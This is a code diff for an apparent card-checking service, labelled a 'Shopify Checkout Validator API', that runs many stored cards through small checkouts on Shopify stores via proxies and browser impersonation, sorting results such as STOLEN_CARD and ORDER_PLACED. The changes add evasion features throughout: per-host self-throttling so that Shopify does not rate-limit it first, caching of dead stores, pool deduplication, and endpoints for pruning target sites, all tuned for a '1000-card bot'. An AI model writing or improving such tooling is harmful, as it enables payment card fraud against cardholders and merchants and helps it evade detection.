@@ -1,8 +1,25 @@
 """
-Shopify Checkout Validator API — Stateless v4.3.2
+Shopify Checkout Validator API — Stateless v4.4.0
 
-v4.3.2:
-  - SITE_CONCURRENCY: 25 → 100 (matches 1000-card bot concurrency)
+Fixes applied in this version (all 4):
+  Fix 1 — Dedupe pool in _auto_validate (was causing 30x traffic concentration
+           on duplicated sites like nxp9rb-pm)
+  Fix 2 — Hard-dead cache: NO_PRODUCT, SITE_REQUIRES_LOGIN,
+           NO_SHOPIFY_PAYMENTS_GATEWAY, PRICE_TOO_HIGH get cached per host
+           for 30min (NO_PRODUCT) or 2h (definitive). Prevents dead sites
+           from being re-picked during the same session.
+  Fix 3 — Per-host self-throttle: 50 hits per host per 60s, then 180s cooldown.
+           Prevents Shopify from rate-limiting you first (would have saved
+           nxp9rb-pm from being throttled at hit #363).
+  Fix 4 — /dead-sites endpoint lists every hard-dead cached host for
+           pruning from sites.txt / MongoDB. /dead-sites/clear resets cache.
+
+New endpoints:
+  GET  /dead-sites         - list hard-dead cached sites
+  POST /dead-sites/clear   - clear hard-dead cache
+  GET  /host-throttle      - list self-throttled sites + config
+
+Existing endpoints unchanged.
 """
 
 import asyncio
@@ -34,7 +51,7 @@ CARDS_FILE        = os.environ.get("CARDS_FILE", "cards.txt")
 MAX_PRICE         = float(os.environ.get("MAX_PRICE", 5.0))
 MIN_AMOUNT        = float(os.environ.get("MIN_AMOUNT", 0.50))
 HARD_MAX_PRICE    = float(os.environ.get("HARD_MAX_PRICE", 20.0))
-SITE_CONCURRENCY  = int(os.environ.get("SITE_CONCURRENCY", 100))   # was 25 — supports 1000-card bot concurrency
+SITE_CONCURRENCY  = int(os.environ.get("SITE_CONCURRENCY", 100))
 AUTO_ATTEMPTS     = int(os.environ.get("AUTO_ATTEMPTS", 30))
 RACE_COUNT        = int(os.environ.get("RACE_COUNT", 3))
 BLACKLIST_THRESHOLD = float(os.environ.get("BLACKLIST_THRESHOLD", 0.92))
@@ -47,6 +64,25 @@ THROTTLE_COOLDOWN = int(os.environ.get("THROTTLE_COOLDOWN", 300))
 REQUEST_TIMEOUT   = float(os.environ.get("REQUEST_TIMEOUT", 25))
 LOG_LEVEL         = os.environ.get("LOG_LEVEL", "warning").upper()
 IMPERSONATE       = os.environ.get("IMPERSONATE", "chrome124")
+
+# ─── Fix 2: hard-dead cache config ───
+_HARD_DEAD_TTL_PERMANENT = int(os.environ.get("HARD_DEAD_TTL_PERMANENT", 7200))  # 2h
+_HARD_DEAD_TTL_PROBABLE  = int(os.environ.get("HARD_DEAD_TTL_PROBABLE",  1800))  # 30min
+_HARD_DEAD_PERMANENT_CODES = frozenset({
+    "SITE_REQUIRES_LOGIN",
+    "NO_SHOPIFY_PAYMENTS_GATEWAY",
+    "PRICE_TOO_HIGH",
+    "PRICE_OVER_MAX",
+})
+_HARD_DEAD_PROBABLE_CODES = frozenset({
+    "NO_PRODUCT",
+    "NO_PRODUCT_FOUND",
+})
+
+# ─── Fix 3: per-host self-throttle config ───
+_HOST_RATE_LIMIT   = int(os.environ.get("HOST_RATE_LIMIT", 50))
+_HOST_RATE_WINDOW  = int(os.environ.get("HOST_RATE_WINDOW", 60))
+_HOST_COOLDOWN_SEC = int(os.environ.get("HOST_COOLDOWN_SEC", 180))
 
 VALID_API_KEYS = set(
     k.strip() for k in os.environ.get("API_KEYS", "oozaruhshop").split(",")
@@ -64,8 +100,7 @@ KNOWN_CARD_RESPONSES = frozenset({
     "PROCESSING_ERROR", "GENERIC_DECLINE", "AMOUNT_TOO_SMALL",
     "INCORRECT_NUMBER", "PICK_UP_CARD", "TEST_MODE_LIVE_CARD",
     "INVALID_PURCHASE_TYPE", "INVALID_PAYMENT_METHOD", "STOLEN_CARD",
-    "LOST_CARD", "RESTRICTED_CARD",
-    "SITE_VALIDATED",
+    "LOST_CARD", "RESTRICTED_CARD", "SITE_VALIDATED",
 })
 
 SKIP_SITE_CODES = frozenset({
@@ -104,8 +139,7 @@ FINAL_CODES = frozenset({
     "PROCESSING_ERROR", "GENERIC_DECLINE", "AMOUNT_TOO_SMALL",
     "INCORRECT_NUMBER", "PICK_UP_CARD", "TEST_MODE_LIVE_CARD",
     "INVALID_PURCHASE_TYPE", "INVALID_PAYMENT_METHOD", "STOLEN_CARD",
-    "LOST_CARD", "RESTRICTED_CARD",
-    "SITE_VALIDATED",
+    "LOST_CARD", "RESTRICTED_CARD", "SITE_VALIDATED",
 })
 
 PROXY_STOP_CODES = frozenset({"PROXY_ERROR"})
@@ -359,6 +393,13 @@ _site_stats: dict[str, dict] = defaultdict(lambda: {
 })
 _site_throttle: dict[str, float] = {}
 
+# ─── Fix 2: hard-dead cache ───
+_HARD_DEAD_CACHE: dict[str, float] = {}
+
+# ─── Fix 3: per-host self-throttle ───
+_HOST_HITS: dict[str, deque] = defaultdict(lambda: deque(maxlen=200))
+_HOST_COOLDOWN: dict[str, float] = {}
+
 _cards_cache: list[dict] = []
 _cards_loaded_at: float = 0.0
 
@@ -610,7 +651,6 @@ def _normalize_response(raw: Optional[str]) -> str:
     msg = str(raw).strip().upper()
     if msg in _EXACT_CODE_MAP:
         return _EXACT_CODE_MAP[msg]
-
     if any(k in msg for k in ("ORDER_PLACED", "PROCESSEDRECEIPT",
                               "PAYMENT_COMPLETE", "ORDER_CREATED")):
         return "ORDER_PLACED"
@@ -712,6 +752,39 @@ def _site_usable(hostname: str) -> tuple[bool, str]:
     if _is_throttled(hostname):
         return False, "THROTTLED"
     return True, ""
+
+# ─── Fix 2: hard-dead cache helpers ───
+def _mark_hard_dead(hostname: str, code: str) -> None:
+    if hostname in _HARD_DEAD_CACHE and _HARD_DEAD_CACHE[hostname] > time.time():
+        return
+    if code in _HARD_DEAD_PERMANENT_CODES:
+        ttl = _HARD_DEAD_TTL_PERMANENT
+    elif code in _HARD_DEAD_PROBABLE_CODES:
+        ttl = _HARD_DEAD_TTL_PROBABLE
+    else:
+        return
+    _HARD_DEAD_CACHE[hostname] = time.time() + ttl
+    log.info("[API] hard-dead cached: %s (%s) for %ds", hostname, code, ttl)
+
+def _is_hard_dead(hostname: str) -> bool:
+    exp = _HARD_DEAD_CACHE.get(hostname)
+    return bool(exp and time.time() < exp)
+
+# ─── Fix 3: per-host self-throttle ───
+def _host_rate_allowed(hostname: str) -> bool:
+    now = time.time()
+    if now < _HOST_COOLDOWN.get(hostname, 0):
+        return False
+    hits = _HOST_HITS[hostname]
+    while hits and hits[0] < now - _HOST_RATE_WINDOW:
+        hits.popleft()
+    if len(hits) >= _HOST_RATE_LIMIT:
+        _HOST_COOLDOWN[hostname] = now + _HOST_COOLDOWN_SEC
+        log.warning("[API] self-throttled %s (%d hits in %ds) for %ds",
+                    hostname, len(hits), _HOST_RATE_WINDOW, _HOST_COOLDOWN_SEC)
+        return False
+    hits.append(now)
+    return True
 
 def _record_site_result(hostname: str, response_code: str) -> None:
     if response_code in TRANSIENT_CODES:
@@ -830,7 +903,7 @@ async def _fetch_products(
                         candidates.append(entry)
 
             if not candidates and cheapest_any is None:
-                _cache_write_failure(hostname, "No products found")
+                _cache_write_failure(hostname, "No products found", ttl=1800)
                 return None, [], "No products found"
 
             if cheapest_any_price > HARD_MAX_PRICE:
@@ -891,6 +964,11 @@ async def validate_card(
            is_site_error: Optional[bool] = None,
            proxy_dead: bool = False) -> dict:
         code_upper = response.upper().split(" - ")[0].split(":")[0].strip()
+
+        # ─── Fix 2: cache hard-dead responses ───
+        if code_upper in _HARD_DEAD_PERMANENT_CODES or code_upper in _HARD_DEAD_PROBABLE_CODES:
+            _mark_hard_dead(hostname, code_upper)
+
         if is_site_error is None:
             is_site_error = code_upper not in KNOWN_CARD_RESPONSES
         final_gateway = gateway if gateway and gateway != "UNKNOWN" else "Shopify Payments"
@@ -918,6 +996,14 @@ async def validate_card(
     if not usable:
         code = reason.split(":")[0].strip() if ":" in reason else reason
         return _r(code, message=reason, is_site_error=True)
+
+    # ─── Fix 2: skip hard-dead sites ───
+    if _is_hard_dead(hostname):
+        return _r("NO_PRODUCT", message="Cached dead site", is_site_error=True)
+
+    # ─── Fix 3: self-throttle check ───
+    if not _host_rate_allowed(hostname):
+        return _r("THROTTLED", message="Self-throttled (rate limit)", is_site_error=True)
 
     sem = _site_semaphores[hostname]
     session, owned = _make_session(proxy_str)
@@ -1829,7 +1915,7 @@ async def validate_card(
                     await res
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# AUTO-VALIDATE
+# AUTO-VALIDATE — Fix 1: dedupe pool
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 def _site_error_result(message: str, last_result: Optional[dict] = None,
@@ -1862,6 +1948,9 @@ async def _auto_validate(
         return _site_error_result(
             "No sites supplied — client must pass `fallback_sites`"
         )
+
+    # ─── Fix 1: dedupe pool (was causing 30x traffic concentration) ───
+    pool = list(dict.fromkeys(pool))
 
     candidates = [
         s for s in pool
@@ -1977,7 +2066,7 @@ async def validate_card_raced(
 # FASTAPI APP
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-app = FastAPI(title="Shopify Validator", version="4.3.2")
+app = FastAPI(title="Shopify Validator", version="4.4.0")
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"],
@@ -2228,13 +2317,73 @@ async def skip_site_route(site: str = Query(...)):
     return JSONResponse({"skipped": host,
                          "until":   int(time.time() + BLACKLIST_SECONDS)})
 
+# ─── Fix 4: dead-sites endpoint for pruning ───
+@app.get("/dead-sites")
+async def dead_sites_route():
+    """List every site currently in the hard-dead cache.
+    Fix 4: use this to prune bad sites from sites.txt / MongoDB permanently."""
+    now = time.time()
+    out = {}
+    for host, exp in list(_HARD_DEAD_CACHE.items()):
+        if now >= exp:
+            continue
+        out[host] = {
+            "expires_in_sec": int(exp - now),
+            "last_code": _site_stats.get(host, {}).get("last_response", ""),
+            "samples": len(_site_stats.get(host, {}).get("outcomes", [])),
+        }
+    return JSONResponse({
+        "count": len(out),
+        "sites": out,
+        "instruction": (
+            "Permanently prune these hosts from sites.txt or MongoDB "
+            "global_sites collection. They will also auto-expire from "
+            "this cache, but pruning at source prevents re-discovery."
+        ),
+    })
+
+@app.post("/dead-sites/clear")
+async def dead_sites_clear_route():
+    n = len(_HARD_DEAD_CACHE)
+    _HARD_DEAD_CACHE.clear()
+    return JSONResponse({"cleared": n})
+
+# ─── Fix 3: host-throttle endpoint for visibility ───
+@app.get("/host-throttle")
+async def host_throttle_route():
+    now = time.time()
+    out = {}
+    for host, until in list(_HOST_COOLDOWN.items()):
+        if now < until:
+            out[host] = {
+                "cooldown_remaining_sec": int(until - now),
+                "hits_last_window": len(_HOST_HITS.get(host, [])),
+            }
+    return JSONResponse({
+        "count": len(out),
+        "sites": out,
+        "config": {
+            "rate_limit": _HOST_RATE_LIMIT,
+            "rate_window_sec": _HOST_RATE_WINDOW,
+            "cooldown_sec": _HOST_COOLDOWN_SEC,
+        },
+    })
+
+@app.post("/host-throttle/clear")
+async def host_throttle_clear_route():
+    n = len(_HOST_COOLDOWN)
+    _HOST_COOLDOWN.clear()
+    for d in _HOST_HITS.values():
+        d.clear()
+    return JSONResponse({"cleared": n})
+
 @app.get("/health")
 async def health_route():
     cards = _get_cards()
     now = time.time()
     return JSONResponse({
         "status":             "ok",
-        "version":            "4.3.2",
+        "version":            "4.4.0",
         "mode":               "stateless",
         "cards_loaded":       len(cards),
         "site_concurrency":   SITE_CONCURRENCY,
@@ -2250,6 +2399,11 @@ async def health_route():
         "blacklist_threshold": BLACKLIST_THRESHOLD,
         "blacklist_samples":   BLACKLIST_SAMPLES,
         "blacklist_seconds":   BLACKLIST_SECONDS,
+        "hard_dead_ttl_permanent": _HARD_DEAD_TTL_PERMANENT,
+        "hard_dead_ttl_probable":  _HARD_DEAD_TTL_PROBABLE,
+        "host_rate_limit":    _HOST_RATE_LIMIT,
+        "host_rate_window":   _HOST_RATE_WINDOW,
+        "host_cooldown_sec":  _HOST_COOLDOWN_SEC,
         "impersonate":        IMPERSONATE,
         "keys_configured":    len(VALID_API_KEYS),
         "cached_products":    len(_product_cache),
@@ -2257,6 +2411,8 @@ async def health_route():
         "blacklisted_sites":  sum(1 for s in _site_stats.values()
                                   if now < s.get("blacklisted_until", 0)),
         "throttled_sites":    sum(1 for t in _site_throttle.values() if now < t),
+        "hard_dead_cached":   sum(1 for exp in _HARD_DEAD_CACHE.values() if now < exp),
+        "self_throttled":     sum(1 for until in _HOST_COOLDOWN.values() if now < until),
     })
 
 @app.get("/stats")
